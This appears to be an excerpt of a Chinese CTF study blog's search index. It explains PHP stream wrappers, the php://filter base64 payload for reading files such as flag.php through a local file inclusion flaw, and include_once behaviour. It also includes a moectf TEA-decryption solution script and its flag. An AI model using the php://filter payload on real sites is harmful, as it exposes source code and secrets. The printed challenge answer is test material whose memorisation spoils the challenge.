    <content type="html"><![CDATA[<p>#php伪协议<br>php伪协议<br>常见的php伪协议</p><p>1）file:&#x2F;&#x2F; 访问本地文件系统</p><p>2）http:&#x2F;&#x2F; 访问HTTP(S)网址</p><p>3）ftp:&#x2F;&#x2F; 访问FTP(S)URL</p><p>4)php:&#x2F;&#x2F; 访问各个输出输入流</p><p>5)zlib:&#x2F;&#x2F; 处理压缩流</p><p>6)data:&#x2F;&#x2F; 读取数据</p><p>7)glob:&#x2F;&#x2F; 查找匹配的文件路径模式</p><p>8)phar:&#x2F;&#x2F; PHP归档</p><p>9)rar:&#x2F;&#x2F; RAR数据压缩</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 是一种利用 PHP 流封装器 (php:&#x2F;&#x2F;filter) 的方式，常用于漏洞利用中，特别是在文件包含或文件读取的攻击场景中。让我们逐步分析其含义：</p><p>分解说明：<br>php:&#x2F;&#x2F;filter：</p><p>php:&#x2F;&#x2F; 是 PHP 的一种流封装协议，它允许直接读取或写入输入、输出、错误流以及其他特殊资源。<br>filter 是一种流过滤器，允许对流进行特定的操作，如编码、解码、压缩、加密等。<br>convert.base64-encode：</p><p>这是流过滤器的一个转换操作，它会将文件内容进行 Base64 编码。Base64 是一种将二进制数据转换为 ASCII 字符的编码方式，常用于网络传输。<br>convert.base64-encode 指定要对目标文件内容进行 Base64 编码。<br>resource&#x3D;flag.php：</p><p>resource 指定了你要操作的文件资源。在这个例子中，flag.php 是目标文件，通常是一个包含敏感信息或标志的文件，可能不允许直接通过浏览器访问。<br>通过流封装器，PHP 会读取 flag.php 的内容，并在流操作中将其进行 Base64 编码。<br>整体功能：<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 的作用是：</p><p>读取 flag.php 文件的内容。<br>使用 Base64 编码对文件内容进行编码。<br>返回编码后的文件内容，而不是直接返回原始内容。<br>典型的利用场景：<br>这通常用于 本地文件包含（LFI）漏洞。在存在 LFI 漏洞的系统中，攻击者可以利用 PHP 的 include、require、file_get_contents 等函数读取任意文件，但有时文件包含被限制或敏感文件的内容不可见。</p><p>通过 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php，攻击者可以绕过某些限制，读取文件并获取其 Base64 编码内容。然后，攻击者可以手动将 Base64 内容解码，查看文件的原始内容。</p><h1 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h1><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul><li>如果文件成功包含，include_once 将会返回 1</li><li>如果文件没有被找到或者在尝试包含文件过程中有错误，include_once 不会返回任何值，但会产生一个警告（除非 error_reporting 被设置成忽略警告）。</li></ul><h3 id="各类文件类型的输出情况"><a href="#各类文件类型的输出情况" class="headerlink" title="各类文件类型的输出情况"></a>各类文件类型的输出情况</h3><p>include_once 的参数不是一个 PHP 文件，那么该文件的内容会被直接输出（或执行，如果有可执行的 PHP 代码）到输出流中。具体的行为取决于该文件的内容和类型。  </p><ol><li><strong>纯文本文件（比如 .txt）</strong>: 文件的内容会被直接输出。</li><li><strong>HTML 文件（比如 .html 或 .htm）</strong>: HTML 代码会被直接输出，浏览器会按照 HTML 来渲染。</li><li><strong>XML 文件或其他标记语言文件</strong>: 文件的内容会被直接输出。</li><li><strong>二进制文件（比如图片或者音频文件）</strong>: 这样做通常不是个好主意，因为二进制数据可能会被错误地解释为文本，导致输出乱码或产生不可预测的结果。</li><li><strong>包含 PHP 代码的非 PHP 文件</strong>: 如果文件中混合有 PHP 代码（即使文件扩展名不是 .php），那么那部分 PHP 代码仍然会被执行。</li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tea.dm</title>
    <link href="/2024/09/10/tea/"/>
    <url>/2024/09/10/tea/</url>
    
    <content type="html"><![CDATA[<h1 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h1><p>终于自己做出一道tea了乐<br>看原题<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122053979.png"><br>&emsp;典型的tea直接套模板，但是有问题，就是py中不会限定为32位所以最后的答案会超级大，我们就要去进行一个&amp;ffffffff的操作使数值正确<br>&emsp;然后就是关于题目中的小问题，首先就是delta，标准的tea是0x9E3779B9，但是在ida中总是会出现变成-0x61c88647的问题需要注意，然后就是最后的v5怎么求,就是一个偏移相加，在exp中有了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v0, v1</span>):<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    v3 = delta * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - ((v0 + v3) ^ (<span class="hljs-number">16</span> * v0 + <span class="hljs-number">1634038898</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - ((v1 + v3) ^ (<span class="hljs-number">16</span> * v1 + <span class="hljs-number">1702060386</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v3 = (v3 - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><span class="hljs-comment">#已知的加密结果</span><br>v4 = <span class="hljs-number">676078132</span><br>v5 = <span class="hljs-number">957400408</span><br><span class="hljs-comment">#解密</span><br>v10, v11 = decrypt(v4, v5)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted v10: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v10)&#125;</span>, v11: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v11)&#125;</span>&quot;</span>)<br>i=<span class="hljs-number">0x49BD</span><br>j=<span class="hljs-number">0x8e00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(j)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(i|(j&lt;&lt;<span class="hljs-number">16</span>)))<br><span class="hljs-comment">#moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>decode</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
